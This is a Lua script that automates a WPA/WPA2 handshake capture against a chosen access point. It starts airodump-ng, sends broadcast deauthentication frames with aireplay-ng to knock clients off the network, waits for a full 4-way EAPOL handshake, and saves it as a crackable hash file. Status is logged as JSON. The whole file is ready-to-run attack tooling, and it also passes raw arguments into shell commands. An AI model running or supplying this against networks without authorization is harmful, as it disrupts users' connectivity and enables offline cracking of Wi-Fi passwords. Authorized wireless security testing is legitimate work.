local iface = arg[1]
local bssid = arg[2]
local output_prefix = arg[3] or "/tmp/handshake_" .. bssid:gsub(":", "")
local channel = tonumber(arg[4]) or 1

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":' .. json_escape(bssid) .. ',"ssid":"","channel":' .. tostring(channel) .. ',"data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local f = io.popen("iw dev " .. iface .. " info 2>/dev/null")
  if not f then return false end
  local out = f:read("*a")
  f:close()
  return out:find("type monitor") ~= nil
end

local function set_channel()
  os.execute("iw dev " .. iface .. " set channel " .. channel .. " 2>/dev/null")
  telemetry("channel_set", '{"channel":' .. tostring(channel) .. '}')
end

local function send_deauth()
  local cmd = "aireplay-ng --deauth 3 -a " .. bssid .. " -c ff:ff:ff:ff:ff:ff " .. iface .. " 2>/dev/null"
  telemetry("deauth_send", '{"cmd":' .. json_escape(cmd) .. '}')
  os.execute(cmd)
end

local function start_capture()
  local pcap = output_prefix .. ".pcap"
  local cmd = "airodump-ng --bssid " .. bssid .. " --channel " .. channel .. " --write " .. output_prefix .. " --output-format pcap " .. iface .. " 2>/dev/null &"
  telemetry("capture_start", '{"cmd":' .. json_escape(cmd) .. ',"pcap":' .. json_escape(pcap) .. '}')
  os.execute(cmd)
  os.execute("sleep 2")
  return pcap
end

local function check_handshake(pcap)
  local attempts = 0
  local max_attempts = 20
  while attempts < max_attempts do
    attempts = attempts + 1
    os.execute("sleep 3")
    local f = io.popen("tshark -r " .. pcap .. " -Y 'eapol' -T fields -e eapol.keydes.key_info 2>/dev/null | sort | uniq", "r")
    if not f then goto next end
    local keys = {}
    for line in f:lines() do
      line = line:match("^%s*(.-)%s*$")
      if line and #line > 0 then keys[line] = true end
    end
    f:close()
    local count = 0
    for _ in pairs(keys) do count = count + 1 end
    telemetry("eapol_keys", '{"unique_key_info":' .. tostring(count) .. ',"attempt":' .. tostring(attempts) .. '}')
    if count >= 3 then
      telemetry("handshake_complete", '{"message":"Full 4-way handshake captured","key_info_count":' .. tostring(count) .. '}')
      return true
    end
    if count >= 1 then
      telemetry("handshake_partial", '{"message":"Partial handshake detected","keys":' .. tostring(count) .. '}')
      send_deauth()
    end
    ::next::
  end
  return false
end

local function verify_hccapx(pcap)
  local f = io.popen("hcxpcapngtool -o /dev/stdout " .. pcap .. " 2>/dev/null | head -3", "r")
  if f then
    local out = f:read("*a")
    f:close()
    if out and #out > 50 then
      telemetry("hash_verified", '{"hash":' .. json_escape(out:sub(1, 200)) .. '}')
      local hf = io.open(output_prefix .. ".hccapx", "w")
      if hf then
        hf:write(out)
        hf:close()
        telemetry("hash_saved", '{"file":' .. json_escape(output_prefix .. ".hccapx") .. '}')
      end
      return true
    end
  end
  return false
end

if not iface or not bssid then
  telemetry("error", '{"error":"Usage: handshake_capture.lua <interface> <bssid> [output_prefix] [channel]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Monitor mode required on ' .. iface .. '"}')
  os.exit(1)
end

local ok, err = pcall(function()
  set_channel()
  local pcap = start_capture()
  send_deauth()
  local captured = check_handshake(pcap)
  if captured then
    verify_hccapx(pcap)
  end
end)

if not ok then
  telemetry("error", '{"error":' .. json_escape(tostring(err)) .. '}')
  os.exit(1)
end

telemetry("complete", '{"bssid":' .. json_escape(bssid) .. ',"output":' .. json_escape(output_prefix) .. '}')
